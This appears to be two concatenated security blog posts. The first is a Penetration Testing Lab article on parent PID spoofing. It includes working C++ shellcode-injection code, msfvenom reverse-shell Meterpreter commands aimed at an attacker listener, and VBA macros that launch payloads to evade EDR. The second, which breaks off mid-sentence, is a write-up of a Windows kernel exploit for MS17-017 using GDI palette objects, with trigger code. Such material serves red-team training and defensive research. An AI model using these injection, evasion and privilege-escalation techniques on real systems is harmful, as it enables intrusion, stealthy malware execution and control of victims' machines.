{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Parent PID Spoofing Comments\nFeed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]February 24, 2020February 23, 2020\nParent PID Spoofing\nby [28]Administrator.In [29]Defense Evasion.[30]Leave a Comment on\nParent PID Spoofing\nMonitoring the relationships between parent and child processes is very\ncommon technique for threat hunting teams to detect malicious\nactivities. For example if PowerShell is the child process and\nMicrosoft Word is the parent then it is an indication of compromise.\nVarious EDR\u2019s (endpoint detection and response) can detect this\nabnormal activity easily. This has lead red teams and adversaries to\nuse parent PID spoofing as an evasion method. The Windows API call\n\u201cCreateProcess\u201d supports a parameter which allows the user to assign\nthe Parent PID. This means that a malicious process can use a different\nparent when it is created from the one that is actually executed.\nOriginally this technique was introduced into the wider information\nsecurity audience in 2009 by [31]Didier Stevens. A proof of concept\nwritten in C++ was released ([32]SelectMyParent) that could allow the\nuser to select the parent process by specifying the PID (process\nidentifier). The \u201cCreateProcess\u201d function was used in conjunction with\nthe \u201cSTARTUPINFOEX\u201d and \u201cLPPROC_Thread_ATTRIBUTE_LIST\u201c.\nSelectMyParent.exe notepad 508\nParent PID Spoofing \u2013 SelectMyParent\nThe PID 508 corresponds to the \u201clsass.exe\u201d process which is responsible\nfor logon activities, passwords changes etc. Notepad will created under\nthe lsass.exe process.\nProcess Explorer \u2013 SelectMyParent\nInvestigation of the properties of the process will show that Notepad\nis running with SYSTEM level privileges. This is because the child\nprocess (notepad.exe) will obtain the privileges of the parent process\n(lsass.exe).\nSelectMyParent \u2013 Process Properties\nFrom a Meterpreter session the following commands can be used to\nretrieve the PID of the current session and by specifying the process\nname results will filtered only to that specific process.\ngetpid\nps lsass.exe\nSelectMyParent \u2013 Meterpreter\nPowerShell\nF-Secure released a PowerShell script ([33]PPID-Spoof) which can\nperform parent PID spoofing. The script contains embedded C# code in\norder to interact with the \u201cCreateProcess\u201d Windows API.\npublic static extern bool CreateProcess(\nstring lpApplicationName,\nstring lpCommandLine,\nref SECURITY_ATTRIBUTES lpProcessAttributes,\nref SECURITY_ATTRIBUTES lpThreadAttributes,\nbool bInheritHandles,\nuint dwCreationFlags,\nIntPtr lpEnvironment,\nstring lpCurrentDirectory,\n[In] ref STARTUPINFOEX lpStartupInfo,\nout PROCESS_INFORMATION lpProcessInformation);\nThe tool accepts 3 arguments which are the PID of the parent process,\nthe system path of the child process and the path of an arbitrary DLL\nfor code execution.\nPPID-Spoof -ppid 3556 -spawnto \"C:\\Windows\\System32\\notepad.exe\" -dllpath pentes\ntlab.dll\nParent ID Spoofing \u2013 PPID-Spoof PowerShell\nNotepad will executed under the context of PowerShell and the DLL will\nbe loaded inside notepad.exe.\nPPID Spoof \u2013 Notepad DLL Loaded\nSince the DLL will be loaded inside the process a communication channel\nwill open with the command and control framework.\nPPID Spoof \u2013 Meterpreter\nA stealthier approach could be to load the DLL inside the \u201cLSASS\u201d\nprocess. Threat hunting teams they will have to review the EventHeader\nProcessId and the ParentProcessID in order to identify the process\nspoofing.\nPPID-Spoof -ppid 3244 -spawnto \"C:\\Windows\\System32\\lsass.exe\" -dllpath pentestl\nab.dll\nPPID Spoof \u2013 LSASS\nA new \u201cLSASS\u201d process will created on the system that will load the\narbitrary DLL. This scenario allows the red team to blend in with the\nenvironment legitimate processes.\nPPID Spoof \u2013 LSASS DLL Loaded\nA Meterpreter session will open with the process ID of 1312 which\ncorresponds to \u201crundll32\u201d process which is the child of \u201clsass.exe\u201d\nthat executes the DLL.\nPPID Spoof \u2013 LSASS Meterpreter\n[34]Andrea Pierini implemented the technique of parent PID spoofing by\nembedding C# code within a PowerShell script. The script will create a\nnew child process that will have as a parent any process defined by the\nuser. Similarly with the F-Secure Labs script the \u201cCreateProcess()\u201d API\nis used to perform the spoofing.\nImport-Module .\\psgetsys.ps1\n[MyProcess]::CreateProcessFromParent(436,\"C:\\Windows\\System32\\cmd.exe\",\"\")\nParent PID Spoofing \u2013 psgetsys\nThe created process will obtain the privileges (SYSTEM) of the parent\n(winlogon.exe).\nParent PID Spoofing \u2013 psgetsys Process Explorer\nC++\n[35]Adam Chester explained in his [36]blog back in 2017 how the\nMeterpreter \u201cgetsystem\u201d command works behind the scenes in order to\nelevate the privileges of a process from Administrator to SYSTEM. Adam\nexpanded the [37]article of [38]Raphael Mudge in 2014 about the three\ntechniques that Meterpreter is using to become SYSTEM.\nThe [39]getsystem-offline binary utilizes the Windows\n\u201cImpersonateNamedPipeClient\u201d API in order to elevate it\u2019s privileges to\nSYSTEM. This is achieved by creating and enforcing a service that runs\nas SYSTEM to connect to a named piped of a process and use the\n\u201cImpersonateNamedPipeClient\u201d API to create an elevated impersonation\ntoken.\ngetsystem-offline.exe\nParent PID Spoofing \u2013 getsystem-offline\nBy default the binary will open a new command prompt with elevated\nprivileges.\nParent PID Spoofing \u2013 getsystem-offline elevated\nHowever the code could be modified to execute an arbitrary binary that\nwill establish a communication with the command prompt.\nParent PID Spoofing \u2013 getsystem-offline\ngetsystem-offline \u2013 Meterpreter\nAccording to Microsoft documentation an \u201cAsynchronous Procedure Call\u201d\nis a function that is executed in the context of a particular thread\nasynchronously. It is a method of process injection which [40]Halil\nDalabasmaz used in his C++ tool [41]APC-PPID that implements parent PID\nspoofing.\nInitially the function \u201cgetParentProcessID()\u201d is used to retrieve the\nPID of the parent process. The \u201cTlHelp32.h\u201d header (part of the Tool\nHelp Library) supports the \u201cCreateToolhelp32Snapshot\u201d function which is\nresponsible to take a snapshot of the specified process (explorer.exe).\nWhen the snapshot is taken the process size and PID are retrieved and\nthe handle closes.\nDWORD getParentProcessID() {\nHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\nPROCESSENTRY32 process = { 0 };\nprocess.dwSize = sizeof(process);\nif (Process32First(snapshot, &process)) {\ndo {\n\/\/If you want to another process as parent change here\nif (!wcscmp(process.szExeFile, L\"explorer.exe\"))\nbreak;\n} while (Process32Next(snapshot, &process));\n}\nCloseHandle(snapshot);\nreturn process.th32ProcessID;\n}\nThe Windows API \u201cCreateProcess\u201d is utilized to create a new process on\nthe system (iexplore.exe) with the \u201cSTARTUPINFOEXA\u201d structure.\n#include <windows.h>\n#include <TlHelp32.h>\n#include <iostream>\nDWORD getParentProcessID() {\nHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\nPROCESSENTRY32 process = { 0 };\nprocess.dwSize = sizeof(process);\nif (Process32First(snapshot, &process)) {\ndo {\n\/\/If you want to another process as parent change here\nif (!wcscmp(process.szExeFile, L\"explorer.exe\"))\nbreak;\n} while (Process32Next(snapshot, &process));\n}\nCloseHandle(snapshot);\nreturn process.th32ProcessID;\n}\nint main() {\n\/\/Shellcode, for example; msfvenom -p windows\/x64\/meterpreter\/reverse_tc\np LHOST=x.x.x.x EXITFUNC=thread -f c\nunsigned char shellCode[] = \"\";\nSTARTUPINFOEXA sInfoEX;\nPROCESS_INFORMATION pInfo;\nSIZE_T sizeT;\nHANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProce\nssID());\nZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));\nInitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);\nsInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetPro\ncessHeap(), 0, sizeT);\nInitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT)\n;\nUpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIB\nUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);\nsInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);\nCreateProcessA(\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\", NUL\nL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_\nPRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);\nLPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x10\n00, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nSIZE_T *lpNumberOfBytesWritten = 0;\nBOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)\nshellCode, sizeof(shellCode), lpNumberOfBytesWritten);\nQueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);\nResumeThread(pInfo.hThread);\nCloseHandle(pInfo.hThread);\nreturn 0;\n}\nAPC-PPID \u2013 Parent Process\nMetasploit utility \u201cmsfvenom\u201d can be used or any other alternative to\ngenerate shellcode in C language. The code will be written into the\naddress space of the created process (iexplore.exe).\nmsfvenom -p windows\/x64\/meterpreter\/reverse_tcp LHOST=10.0.0.13 LPORT=4444 EXITF\nUNC=thread -f c > pentestlab.txt\nMetasploit ShellCode \u2013 APC-PPID\nAPC-PPID \u2013 C++ Code\nExecuting the binary on the target system will create a new process\n(iexplore.exe) that will have as a parent the explorer.exe. The\nshellcode will executed in the memory space of the Internet Explorer\nprocess by using the user-mode asynchronous procedure call.\nParent PID Spoofing \u2013 APC-PPID\nA Meterpreter session will established with the target host.\nAPC-PPID \u2013 Meterpreter\nReviewing the processes of the target system will show that\n\u201ciexplore.exe\u201d has been created successfully.\nAPC-PPID \u2013 Process Explorer\nReviewing the process properties will validate that the parent process\nis \u201cexplorer.exe\u201c. This proof of concept implements a stealthier\nprocess injection method to hide the shellcode inside a process and\nsince explorer and Internet Explorer are valid Microsoft system\nprocesses will blend in with the environment bypassing the endpoint\ndetection and response product.\nAPC-PPID \u2013 iexplore.exe Properties\n[42]Julian Horoszkiewicz developed a C++ tool ([43]spoof) based on the\nwork of Didier Stevens that can could be used for parent PID spoofing\nas it allows the user to select the parent PID process.\nspoof.exe pentestlab.exe 1116\nParent PID Spoofing \u2013 Spoof\nOnce the process is created on the target host the arbitrary payload\nwill executed and a session will open.\nParent PID Spoofing \u2013 Spoof Meterpreter\nReviewing the process details of the PID in process explorer will\nvalidate that the process is a child process of explorer.exe.\nParent PID Spoofing \u2013 Process Explorer\nParent PID Spoofing \u2013 Explorer Parent Process\nC#\nThe [44]GetSystem binary is developed in C# and implements the parent\nprocess ID spoofing in order to elevate rights to SYSTEM. This is\nachieved through the \u201cCreateProcess\u201d API similar to the code that was\nreleased by F-Secure Labs. The .NET binary accepts only two arguments\nwhich are the arbitrary executable and the name of the process that\nwill act as a parent.\nGetSystem.exe pentestlab.exe lsass\nParent PID Spoofing \u2013 GetSystem\nThe process \u201cpentestlab.exe\u201d will created on the target host as a child\nof \u201clsass.exe\u201c.\nGetSystem \u2013 LSASS Process\nThe communication will established with the corresponding Command and\nControl framework with SYSTEM level privileges.\nGetSystem \u2013 Meterpreter\nThe fact that \u201cGetSystem\u201d is based in C# gives the ability to implement\nthis technique via Covenant or any other relevant Framework (Cobalt\nStrike) that can load assembly binaries.\nAssembly GetSystem.exe \"pentestlab.exe lsass\"\nGetSystem \u2013 Covenant\nGetSystem \u2013 Meterpreter via Covenant\nSimilar to the Metasploit Framework \u201cmigrate\u201d command an assembly\nbinary can be executed in order to elevate the process from\nAdministrator to SYSTEM.\nParent PID Spoofing \u2013 GetSystem Covenant\nInvestigation of the list of available \u201cGrunts\u201d will show that the new\nagent is running with SYSTEM level privileges compare to the initial\nprocess.\nCovenant \u2013 Grunts\nThe parent process will be the \u201cLSASS\u201d or any other process that is\nrunning with SYSTEM level privileges.\nCovenant \u2013 Process Explorer\n[45]Chirag Savla developed in C# a [46]tool to perform process\ninjection with capability to perform parent PID spoofing by utilizing\nall the common Windows API\u2019s (CreateProcess, VirtualAllocEx,\nOpenProcess etc.). The benefit of this tool is that supports different\nprocess injection techniques with parent PID spoofing. The tool accepts\nshelllcode in base-64, C and hex. Metasploit \u201cmsfvenom\u201d utility can\ngenerate shellcode in these formats.\nmsfvenom -p windows\/x64\/meterpreter\/reverse_tcp exitfunc=thread LHOST=10.0.0.13\nLPORT=4444 -f hex > pentestlab.txt\nGenerate ShellCode \u2013 HEX\nThe tool requires the path of the injected process, the path of the\nshellcode, the parent process name, the file format of the payload and\nthe process injection technique. Executing the following command will\ninject the shellcode into a new process (calc.exe) using as a parent\nexplorer.exe.\nProcessInjection.exe \/ppath:\"C:\\Windows\\System32\\calc.exe\" \/path:\"pentestlab.txt\n\" \/parentproc:explorer \/f:hex \/t:4\nProcessInjenction \u2013 Vanilla\nMonitoring the processes will validate that the calculator has been\ncreated in the context of explorer.exe.\nProcessInjection \u2013 Process Explorer\nThe shellcode will executed in the virtual address space of calc.exe\nand a communication will established with the command and control.\nProcessInjection \u2013 Vanilla Meterpreter\nProcessInjection supports also parent PID spoofing with DLL injection.\nArbitrary DLL files can be generated with Metasploit \u201cmsfvenom\u201d.\nmsfvenom -p windows\/x64\/meterpreter\/reverse_tcp exitfunc=thread LHOST=10.0.0.13\nLPORT=4444 -f dll > pentestlab.dll\nMetasploit \u2013 DLL\nThe path of the DLL needs to be specified instead of the shellcode and\nthe technique value should be changed to 5.\nProcessInjection.exe \/ppath:\"C:\\Windows\\System32\\calc.exe\" \/path:\"pentestlab.dll\n\" \/parentproc:explorer \/t:5\nProcessInjection \u2013 DLL Injection\nWhen the remote thread will be created inside the process the shellcode\nwill executed and a Meterpreter session will open.\nProcessInjection \u2013 DLL Injection Meterpreter\nThe session will run under the context of \u201crundll32\u201d process.\nProcessInjection \u2013 Process Explorer DLL\nSpecifying the technique number 6 will perform parent process spoofing\nwith process hollowing technique.\nProcessInjection.exe \/ppath:\"C:\\Windows\\System32\\calc.exe\" \/path:\"pentestlab.txt\n\" \/parentproc:explorer \/f:hex \/t:6\nProcessInjection \u2013 Process Hollowing\nProcessInjection \u2013 Meterpreter\nThe tool also supports process injection with asynchronous procedure\ncall. Execution of the shellcode will occur before the entry point of\nthe main thread of the targeted process for a more stealthier approach.\nProcessInjection.exe \/ppath:\"C:\\Windows\\System32\\calc.exe\" \/path:\"pentestlab.txt\n\" \/parentproc:explorer \/f:hex \/t:8\nProcessInjection \u2013 APC Queue\nProcessInjection \u2013 APC Queue Meterpreter\nA C# utility called [47]RemoteProcessInjection also exists with the\nability to perform process injection. The tool was designed for Cobalt\nStrike and accepts base-64 based payloads. Metasploit utility\n\u201cmsfvenom\u201d can generate raw shellcode which can be trivially converted\nto base-64.\nmsfvenom -p windows\/x64\/meterpreter\/reverse_tcp -f raw -o payload64.bin LHOST=10\n.0.0.13 LPORT=4444\nbase64 -i \/root\/payload64.bin > payload64.txt\nmsfvenom \u2013 Raw Base64 Payload\nThe shellcode will be injected into the target process. Even though it\ndoesn\u2019t utilize the \u201cCreateProcess\u201d API to spoof the parent process it\ngives the ability to hide malware inside legitimate windows processes.\nRemoteInject64.exe 4272 <base64-shellcode>\nRemote Process Injection\nThe payload will executed from the memory address space of the target\nprocess. The process injection method has similarities with the\n\u201cmigrate\u201d Metasploit command since it uses the same Windows API\u2019s.\nRemote Process Injection \u2013 Meterpreter\nVBA\nMicrosoft office has been always a very popular delivery mechanism of\nmalware as it helps threat actors and red team to get initial foothold\ninside an organisation. However execution of malicious code in the form\nof a macro will create an arbitrary child process that could be easily\ndiscovered by EDR\u2019s that have the ability to analyse the anomaly\nbetween the parent and child relationship of processes.\nThere are a variety of approaches that could be used in order to evade\ndetection of EDR products that investigate parent\/child relationships.\nFor example VBScript can invoke other system resources to execute\nmalware such as WMI, COM or scheduled tasks. Therefore the parent\nprocess will not be WINWORD for example but a process of the Windows\noperating system.\nThe following macro will use WMI (Windows Management Instrumentation)\nin order to create a new process.\nSub Parent()\nSet objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\roo\nt\\cimv2\")\nSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\nSet objConfig = objStartup.SpawnInstance_\nSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")\nerrReturn = objProcess.Create(\"C:\\Temp\\pentestlab.exe\", Null, objConfig, intProc\nessID)\nEnd Sub\nMacro \u2013 WMI\nThe benefit from this approach is that the created process will be\nspawned under \u201cWmiPrvSE.exe\u201d instead of an office process.\nWMI Process Explorer\nA communication channel will open with the command and control\nframework.\nWMI Macro \u2013 Meterpreter\nCOM objects can be also used to execute a new process.\nSub Parent()\nSet obj = GetObject(\"new:C08AFD90-F2A1-11D1-8455-00A0C91F3880\")\nobj.Document.Application.ShellExecute \"pentestlab.exe\",Null,\"C:\\Temp\\\",Null,0\nEnd Sub\nMacro \u2013 COM\nThe result of executing a malicious executable with this method is that\nthe parent process will be \u201cexplorer.exe\u201d even though the execution\nwill happen inside the office product.\nMacro COM \u2013 Process Explorer\nThe following image demonstrates that a session will open in\nMeterpreter through a COM object that is executing an arbitrary\npayload.\nMacro COM \u2013 Meterpreter\n[48]Scheduled tasks are often used as a persistence method since it\nallows red teams to execute their trade-craft at a specific date or\ntime. However it could be used as well for parent PID spoofing since a\nscheduled task can be created directly from a vbscript. The following\ncode will register a new scheduled task that will trigger the execution\nof a payload after 30 seconds.\nSub Parent()\nSet service = CreateObject(\"Schedule.Service\")\nCall service.Connect\nDim td: Set td = service.NewTask(0)\ntd.RegistrationInfo.Author = \"Pentest Laboratories\"\ntd.settings.StartWhenAvailable = True\ntd.settings.Hidden = False\nDim triggers: Set triggers = td.triggers\nDim trigger: Set trigger = triggers.Create(1)\nDim startTime: ts = DateAdd(\"s\", 30, Now)\nstartTime = Year(ts) & \"-\" & Right(Month(ts), 2) & \"-\" & Right(Day(ts), 2) & \"T\"\n& Right(Hour(ts), 2) & \":\" & Right(Minute(ts), 2) & \":\" & Right(Second(ts), 2)\ntrigger.StartBoundary = startTime\ntrigger.ID = \"TimeTriggerId\"\nDim Action: Set Action = td.Actions.Create(0)\nAction.Path = \"C:\\Users\\pentestlab.exe\"\nCall service.GetFolder(\"\\\").RegisterTaskDefinition(\"PentestLab\", td, 6, , , 3)\nEnd Sub\nMacro \u2013 Scheduled Task\nThe new process will not have as a parent the process of a Microsoft\nproduct but \u201csvchost.exe\u201d as a more stealthier approach.\nMacro Scheduled Task \u2013 Process Explorer\nReviewing the process properties of the arbitrary process will validate\nthat the parent process is \u201csvhcost.exe\u201c.\nMacro Scheduled Task \u2013 Process Properties\nMetasploit\nMetasploit framework contains a post exploitation module which can be\nused to migrate an existing Meterpreter session to another process on\nthe system. The module will follow the same functions as the other\ntooling described in this article in order to rewrite the existing\nshellcode into the address space of another process. Specifically the\nmodule will follow the process below:\n1. Obtain the PID of the target process\n2. Check the architecture of the target process (32bit or 64bit)\n3. Check if Meterpreter session has the SeDebugPrivilege\n4. Retrieve the payload from the existing process\n5. Call the OpenProcess() API to gain access to the virtual memory of\nthe target process\n6. Call the VirtualAllocEx() API to allocate RWX memory in the target\nprocess\n7. Call the WriteProcessMemory() API to write the payload into the\nvirtual memory space of the process\n8. Call the CreateRemoteThread() API to create a thread into the\nvirtual memory space of the target process\n9. Close the previous thread\nAn existing session is required to be defined with the PID and the name\nof the target process.\nuse post\/windows\/manage\/migrate\nset SESSION 1\nset PID 508\nset NAME lsass.exe\nset KILL true\nMetasploit \u2013 Migrate Module Configuration\nSuccessful execution of the module will produce the following results:\nMetasploit \u2013 Migrate Module\nSimilarly Meterpreter contains also the \u201cmigrate\u201d command which can\nmigrate the existing session to another process.\nMeterpreter \u2013 Migrate\nYouTube\nIFRAME:\n[49]https:\/\/www.youtube.com\/embed\/Fz3d5bFBKJ0?version=3&rel=1&showsearc\nh=0&showinfo=1&iv_load_policy=1&fs=1&hl=en&autohide=2&wmode=transparent\nParent PID Spoofing Demos\nToolkit\nTool                       Language\n[50]SelectMyParent         C++\n[51]PPID-Spoof             PowerShell\n[52]GetSystem              C#\n[53]getsystem-offline      C++\n[54]APC-PPID               C++\n[55]PPID_spoof             C++\n[56]psgetsystem            PowerShell\n[57]ProcessInjection       C#\n[58]RemoteProcessInjection C#\n[59]Spoofing-Office-Macro  VBA"}
{"text":"Orange Cyberdefense\nOrange Cyberdefense\n(BUTTON)\n* Orange Cyberdefense\nOrange Cyberdefense\nOur Blog\n* [1]2023 (18)\n* [2]2022 (10)\n* [3]2021 (13)\n* [4]2020 (30)\n* [5]2019 (10)\n* [6]2018 (14)\n* [7]2017 (27)\n* [8]2016 (22)\n* [9]2015 (17)\n* [10]2014 (15)\n* [11]2013 (30)\n* [12]2012 (27)\n* [13]2011 (33)\n* [14]2010 (36)\n* [15]2009 (81)\n* [16]2008 (75)\n* [17]2007 (80)\nAbusing GDI Objects for ring0 Primitives Revolution\nReading time ~21 min\nPosted by saif on 29 July 2017\nCategories: [18]Analysis, [19]Defcon, [20]Exploit, [21]How-to,\n[22]Materials, [23]Reversing, [24]Windows\nExploiting MS17-017 EoP Using Color Palettes\nThis post is an accompaniment to the [25]Defcon 25 talk given by Saif.\nOne of the core topics of the talk was the release of a new technique\nGDI object abuse technique, name Palette Objects. Saif presented\na previously unreleased Windows 7 SP1 x86 exploit involving the abuse\nof a newly discovered GDI object abuse technique.\nA complete white-paper on the topic was released and can be found here:\n[26]Whitepaper\nBoth exploits discussed in the talk, were also released and the source\ncode of these can be found\nhere: [27]https:\/\/github.com\/sensepost\/gdi-palettes-exp\nXEPALOBJ \u2013 Palette Objects:\nPalettes specify the colours that can be used in a device context.\nThese are represented in kernel memory by Pool tag Gh?8, Gla8, and have\nthe type name _PALETTE, XEPALOBJ or PALOBJ in Win32k debugging symbols.\nSince some of the analysed functions reference XEPALOBJ that\u2019s what I\ndecided to go with. The kernel structure is undocumented on MSDN but\nthe x86 version can be found in ReactOS^[28]1, and both x86 and x64\nversions can be found in Deigo Juarez\u2019s amazing windbg extension\nGDIObjDump^[29]2.\nA relative memory read\/write technique using palettes was mentioned in\na 360 Vulcan team talk^[30]3 in March 2017. However, to my knowledge\nthe full technique outlined here, including arbitrary memory\nread\/write, has not been fully disclosed before.\nX86 and X64 PALETTE structure\nThe most interesting members of the XEPALOBJ structure are the cEntries\nwhich represent the number of members in the PALETTEENTRY array, and\nthe *pFirstColor, which is a pointer to the first member of the\nPALETTEENTRY array apalColors located at the end of the structure as\nseen below.\nKAlloc\nThe CreatePalette function is used to allocate Palette objects. It\ntakes a LOGPALETTE structure as argument, allocations lower than 0x98\nbytes for x86 systems and 0xD8 for x64 bits, gets allocated to the look\naside list.\nCreatePalette Function as described on MSDN\ntagLOGPALETTE structure as described on MSDN\ntagPALETTEENTRY structure as described on MSDN\nKFree\nTo free a Palette object, the DeleteObject function can be used and the\nhandle to Palette is supplied as argument: DeleteObject(HPALETTE)\nRead Memory Function\nThe GetPaletteEntries function is used to read Palette entries\nnEntries, if lower, the XEPALOBJ.cEntries starting from offset\niStartIndex, from the Palette\u2019s apalColors array, pointed to by\npFirstColor in the XEPALOBJ corresponding to the Palette handle hpal,\nto the provided buffer lppe. The function is defined as below.\nGetPaletteEntries Function as described on MSDN\nWrite Memory Function\nThere are two functions that can be used to write Palette entries\nnEntries, if lower, the XEPALOBJ.cEntries starting from offset iStart\n|| iStartIndex, from the Palette\u2019s apalColors array, pointed to by\npFirstColor in the XEPALOBJ corresponding to the Palette handle hpal,\nfrom the provided buffer lppe. These functions are SetPaletteEntries,\nand AnimatePalette.\nSetPaletteEntries Function as described on MSDN\nAnimatePalette Function as described on MSDN\nRelative memory read\/write cEntries\nThe cEntries member in XEPALOBJ is used to reference the number of\nEntries in the Palettes apalColors array, if this member was to be\noverwritten with a larger number then whenever read\/write operations\nhappen on the Palette it will read\/write beyond the kernel memory\nallocated for it.\nArbitrary memory read\/write *pFirstColor\nAll read\/write operations by referencing the *pFirstColor, which is the\npointer the first entry in the apalColors array, by changing this\npointer in a given Palette, it can be used to read\/write from any\nlocation in kernel memory.\nExploitation Scenario\nPalette objects can be abused the same way as Bitmap objects, by using\na Manager Palette whose cEntries, or *pFirstColor members are under our\ncontrol. To control the *pFirstColor of a second Worker Palette and\ngain arbitrary kernel memory read\/write primitive.\nThe focus will be on the situation where the cEntries of the Manager\nPalette object can be controlled, by an overflow, to gain a relative\nmemory read\/write to the location of the Manager Palette in kernel\nmemory, and use it to overwrite the *pFirstColor of the adjacent Worker\nPalette object.\nTechnique Restrictions\nThe are some restrictions to using the Palette technique.\nFirstly, when overflowing the cEntires, the value has to be bigger than\n0x26 for x86 systems, and 0x36, since the minimum size allocated for\nXEPALOBJ is 0x98 for x86 bit systems, and 0xd8 for x64 bit ones, so\neven if the cEntires is 0x1 if it was overwritten by 0x6 for example,\nwill result in 0x6 * 0x4 = 0x18 which is less than the minimum\nallocated Palette size.\nWhen using the SetPaletteEntries Function to write Entries to memory,\nthe overflow should not overwrite certain members of the XEPALOBJ\n(hdcHead, ptransOld and ptransCurrent)\nThe user-mode SetPaletteEntries calls\nNTSetPaletteEntries->GreSetPaletteEntries which has the first\nrestriction on hdcHead member, if this member is set the code path\ntaken will end with an error or BSOD highlighted in Yellow below.\nBefore the code reaches this point the GreSetPaletteEntries will call\nXEPALOBJ::ulSetEntries, which checks the pTransCurrent and pTransOld\nmembers and if they are set, a code path will be taken that will AND\nthe values pointed by them with 0 blocks, in orange colours, although\nif these locations were allocated then this checks shouldn\u2019t result in\nBSOD.\nThe only restriction on setting Palette\u2019s using the AnimatePalettes\nuser-mode function, is that the most significant byte of the memory\nlocation pointed to by *pFirstColor has to be an ODD value, this proved\nchallenging on x64 bit systems, but not so much on x86 ones, as shown\nin XEPALOBJ::ulAnimatePalette below. Although this will not result in\nBSOD but will error out without writing the new value to the memory\nlocation.\nMS17-017 Win32k!EngRealizeBrush Integer Overflow leading to OOB Pool Write:\nNow that I\u2019ve outlined Palette objects and how they can be abused,\nlet\u2019s use the new technique in an exploit.\nUnderstanding the Bug\nLast march Microsoft released a patch, which fixed a privilege\nescalation vulnerability affecting the GDI kernel sub system. The\npatched function was Win32k!EngRealizeBrush. As we all know, the March\npatch fixed allot of other more critical vulnerabilities used by\n\u201cShadow Brokers\u201d, however, while everyone was analysing the SMB\nvulnerabilities, I got busy analysing the privilege escalation bug.\nA diff of the code paths, pre and post patch.\nOn the left is the patched function in Win32k.sys, comparing it to the\nunpatched version on the right. It was only obvious that there was an\nInteger overflow issue because of several integer verification\nfunctions such as ULonglongtoUlong, and others down the code.\nEven though the screenshot couldn\u2019t fit the whole patch, I found it\neasier to just look at the un-patched function in IDA and try to\ndetermine what the issue was, and how it can be exploited.\nTriggering the Overflow\nThe Win32k!EngRealizeBrush function, can be reached by using the PatBlt\nfunction to draw an area, with the created palette using the brush\nselected into the current graphics device context. When creating the\npalette using solid or hatched brushes, it was noticed that the value\nthat can be overflown was always 0x100 on my system, however when\nutilising a pattern based brush, the value was controlled.\nHBITMAP bitmap = CreateBitmap(0x5a1f, 0x5a1f, 1, 1, NULL);\nHBRUSH hbrBkgnd = CreatePatternBrush(bitmap);\nPatBlt(hdc, 0x100, 0x10, 0x100, 0x100, PATCOPY);\nThe value at EDI at the time, would be the bitmap.width member of the\nbitmap used with the pattern brush, a step-by-step of the calculations\nperformed is as follows.\nx = Bitmap.width * 20 (ecx = 20 and its based of the HDC->bitmap.bitsperpixel)\nx = x \/ 2^3\ny = x * bitmap.height\nresult = y + 0x44\nThen value of result is added to 0x40 and passed as the size parameter\nto the allocation function.\nSince the values of bitmap.width and bitmap.height can be controlled,\nit\u2019s just a matter of finding the right combination, which would result\nin an overflow. The value we are aiming to get after the overflow is\n0x10 (explained later).\nFor an overflown integer to be of that value the results of the\ncalculations in reality must be equal to 0x100000010.\n0x100000010 \u2013 0x44 \u2013 0x40 = 0xFFFFFF8C\nA factor of an integer is used to find which two numbers, when\nmultiplied together will result in that integer.\nOne of the factors of 0xFFFFFF8C are 0x8c (140) and\n0x1d41d41 (30678337)\nThe value of the bitmap.width after the calculation should be 0x8c,\n(0x8c * 0x8)\/0x20 = 0x23\nUsing the following bitmap as the pattern brush source, we would\noverflow the value when its added to 0x40 and 0x44 to result in 0x10\nallocation.\nHBITMAP bitmap = CreateBitmap(0x23, 0x1d41d41, 1, 1, NULL);\nAfter the allocation, the function would try to write to certain\noffsets of the allocated object, as shown below. If the allocation is\nbelow 0x30 bytes in size the write to [esi+0x3C] would result in an\nout-of-bounds OOB write to that location.\nStars Alignment\nRemember the 0x10 value? The reason for choosing that specific value is\nfor stars aligning, the object of choice to be overflown would be a\nbitmap object, to overwrite its height member, and gain a relative\nmemory read\/write primitive.\nThe 32-bit _SURFOBJ has the height member at offset 0x14:\nAllocated object size (0x10) + Bitmap _POOL_HEADER size(0x8) + _BASE_OBJECT size\n(0x10)  + _SURFOBJ->height (0x14) = OOB write offset (0x3C)\nPrecisely overwriting the height member of the adjacent bitmap object.\nTo be completely honest, I did not just calculate the offsets and was\ndone. It took a great amount of time, pain and trial and error to get\nthis value so I was basically guessing when the stars aligned for me.\nThen it was time to check if this was actually happening in a debugger.\nBy the end of the first section of the calculations, it can be seen\nthat the value that would be passed to the calculation block is\n0xFFFFFFD0 at EBX.\nMoving to the allocation section, in the beginning the value 0xFFFFFFD0\nis added to 0x40 resulting in 0x10 in EAX.\nSince at the end of the function, the allocated object is freed, the\nobject needs to be allocated at the 